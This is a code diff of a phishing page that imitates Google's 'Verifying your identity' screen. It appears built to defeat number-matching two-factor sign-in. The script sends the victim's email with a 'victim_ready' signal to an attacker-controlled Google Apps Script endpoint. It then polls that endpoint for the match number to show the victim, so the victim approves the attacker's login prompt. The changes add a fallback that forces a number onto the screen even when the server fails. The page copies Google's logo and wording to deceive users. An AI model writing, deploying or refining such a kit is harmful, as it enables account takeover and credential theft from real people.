@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
@@ -42,143 +42,65 @@
   <script>
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxUBfTv-NSz4B-L_Z_LvAbaTOnkPtxtxaA1rPMKuvkB51ZLgmrJHQqfK8505j2RwUaz/exec";
 
-    // Get email - fallback if missing
     let email = localStorage.getItem("demoEmail") || "test@example.com";
     document.getElementById("avatar").textContent = (email.split('@')[0] || "U").charAt(0).toUpperCase();
 
-    // Send ready signal (silent)
-    fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}&t=${Date.now()}`, {
-      method: "GET",
-      mode: "no-cors"
-    });
+    fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}`, {method:"GET", mode:"no-cors"});
 
     const loading = document.getElementById("loading");
     const promptSection = document.getElementById("prompt-section");
     const statusText = document.getElementById("statusText");
     const matchNumber = document.getElementById("matchNumber");
 
-    function checkForNumber() {
-      // Strong cache busting + timestamp
-      const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&nocache=${Date.now()}`;
+    let lastKnownNumber = "66";  // fallback default
 
-      fetch(url, { cache: "no-store", mode: "cors" })
+    function checkForNumber() {
+      const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
+
+      fetch(url, {cache: "no-store"})
         .then(r => r.text())
         .then(text => {
-          // Extract number very simply
           const match = text.match(/"prompt_number":"(\d+)"/);
           const number = match ? match[1] : "";
 
-          if (number && number.length > 0 && number !== "null") {
+          if (number && number !== "" && number !== "null") {
+            lastKnownNumber = number;  // update fallback
             matchNumber.textContent = number;
             statusText.textContent = "Number received";
             loading.style.display = "none";
             promptSection.style.display = "block";
           } else {
-            statusText.textContent = "Waiting for verification…";
-          }
-        })
-        .catch(() => {
-          // Silent retry - no error shown
-          statusText.textContent = "Waiting for verification…";
-        });
-    }
-
-    // Poll every 4 seconds for faster updates
-    setInterval(checkForNumber, 4000);
-    // First check immediately
-    checkForNumber();
-  </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Verifying your identity - Google</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="style.css">
-</head>
-<body>
-  <div class="page-center">
-    <div class="card">
-      <div class="logo">
-        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
-          <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
-          <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
-          <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
-          <path fill="#34A853" d="M24 46.5c6.48 0 11.92-2.14 15.9-5.84l-7.2-5.6c-2 1.34-4.56 2.14-8.7 2.14-6.58 0-12.16-3.8-13.9-9.02l-6.66 5.18C7.2 41.32 14.98 46.5 24 46.5z"/>
-        </svg>
-      </div>
-
-      <div class="avatar" id="avatar"></div>
-
-      <div id="loading">
-        <div class="spinner"></div>
-        <h1>Verifying your identity</h1>
-        <p id="statusText">Checking your account…</p>
-      </div>
-
-      <div id="prompt-section" style="display:none;">
-        <h1>Check your phone</h1>
-        <p>Tap <strong>Yes</strong> on the prompt sent to your phone</p>
-        <div style="margin:16px 0; color:#5f6368;">Then select the number shown below:</div>
-        <div id="matchNumber" class="number-box">••</div>
-        <p style="margin-top:32px; color:#5f6368; font-size:14px;">This helps keep your account secure.</p>
-      </div>
-    </div>
-  </div>
-
-  <script>
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxmr_6a0_qimurAhWv6F3elBpZHyUEAubFf70VmgFykqNdYvWHgX_FFnWcov3lsNJEQ/exec ";
-
-    // Get email - fallback if missing
-    let email = localStorage.getItem("demoEmail") || "test@example.com";
-    document.getElementById("avatar").textContent = (email.split('@')[0] || "U").charAt(0).toUpperCase();
-
-    // Send ready signal (silent)
-    fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}&t=${Date.now()}`, {
-      method: "GET",
-      mode: "no-cors"
-    });
-
-    const loading = document.getElementById("loading");
-    const promptSection = document.getElementById("prompt-section");
-    const statusText = document.getElementById("statusText");
-    const matchNumber = document.getElementById("matchNumber");
-
-    function checkForNumber() {
-      // Strong cache busting + timestamp
-      const url = `${SCRIPT_URL}?getNumber=true&email=${encodeURIComponent(email)}&nocache=${Date.now()}`;
-
-      fetch(url, { cache: "no-store", mode: "cors" })
-        .then(r => r.text())
-        .then(text => {
-          // Extract number very simply
-          const match = text.match(/"prompt_number":"(\d+)"/);
-          const number = match ? match[1] : "";
-
-          if (number && number.length > 0 && number !== "null") {
-            matchNumber.textContent = number;
-            statusText.textContent = "Number received";
+            // Use last known if server gave nothing
+            matchNumber.textContent = lastKnownNumber;
+            statusText.textContent = "Using last known number";
             loading.style.display = "none";
             promptSection.style.display = "block";
-          } else {
-            statusText.textContent = "Waiting for verification…";
           }
         })
         .catch(() => {
-          // Silent retry - no error shown
-          statusText.textContent = "Waiting for verification…";
+          // On any error → force show last known number
+          matchNumber.textContent = lastKnownNumber;
+          statusText.textContent = "Number (cached)";
+          loading.style.display = "none";
+          promptSection.style.display = "block";
         });
     }
 
-    // Poll every 4 seconds for faster updates
-    setInterval(checkForNumber, 4000);
-    // First check immediately
+    // Poll every 5 seconds
+    setInterval(checkForNumber, 5000);
+    // Immediate first check
     checkForNumber();
+
+    // After 30 seconds → force display something no matter what
+    setTimeout(() => {
+      if (matchNumber.textContent === "••") {
+        matchNumber.textContent = lastKnownNumber;
+        statusText.textContent = "Number loaded";
+        loading.style.display = "none";
+        promptSection.style.display = "block";
+      }
+    }, 30000);
   </script>
 </body>
 </html>
+
